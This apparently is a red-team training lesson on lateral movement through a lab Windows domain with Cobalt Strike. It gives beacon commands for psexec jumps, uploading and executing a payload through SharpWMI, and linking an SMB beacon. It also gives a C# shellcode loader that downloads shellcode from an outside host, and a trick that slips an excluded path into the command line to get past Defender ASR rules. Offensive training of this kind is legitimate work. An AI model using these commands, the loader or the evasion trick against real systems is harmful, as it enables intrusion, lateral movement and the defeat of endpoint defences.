
In general, at this point - we should have relatively valid bypasses in place in order to move laterally against machines. This regularly can be completed with a simple use of Cobalt Strike's `jump` utility.

We must be running in the context of a the user who is a local admin on the machine we are jumping to, meaning we must utilize a bit of domain recon and Kerberos ticket forgery before performing a form of lateral movement.

```
beacon> jump psexec64 wkstn-2.acme.corp beacon-smb
```

However, in some cases, we may need to utilize other methods just in the rare case that there are yara rules in place to block activity.

The most applicable way to bypass this is to use our shellcode loader and giving it SMB shellcode, rather than regular HTTPS shellcode.

```C#
using (var client = new WebClient())
{
    // enable proxy
    client.Proxy = WebRequest.GetSystemWebProxy();
    client.UseDefaultCredentials = true;

    // set tls version relevant to proxy
    ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls13;

    // change me
    shellcode = client.DownloadData("https://www.infinity-bank.com/sc_smb.bin"); <- Adjust for your hosted shellcode
};
```

ASR rules also exist to block, especially if we are using a tool such as SharpWMI.

![](https://files.cdn.thinkific.com/file_uploads/584845/images/00e/d52/4ce/monitored.png)

We can bypass this by utilizing a command-line exclusion and having an excluded snippet of text somewhere in our code. Take the below CLI exclusion list as an example.

![](https://files.cdn.thinkific.com/file_uploads/584845/images/5ed/a76/714/excluded.png)

We can add `:\Windows\ccmcache\` to a random line of our `execute-asasembly` command.

```
beacon> cd \\wkstn-1\c$\ProgramData\Microsoft\Search
beacon> upload C:\Payloads\freeloader.exe
beacon> execute-assembly C:\Tools\SharpWMI\SharpWMI\bin\Release\SharpWMI.exe action=exec computername=WKSTN-1 command="C:\ProgramData\Microsoft\Search\freeloader.exe --path C:\Windows\ccmcache\cache"
```

```
[*] Host                           : WKSTN-1
[*] Command                        : C:\ProgramData\Microsoft\Search\freeloader.exe --path C:\Windows\ccmcache\cache
[*] Creation of process returned   : 0
[*] Process ID                     : 264

beacon> link wkstn-1.acme.corp TSVCPIPE-8401022c-70ed-48b4-8231-7461af611337
[+] established link to child beacon: 10.10.120.101
```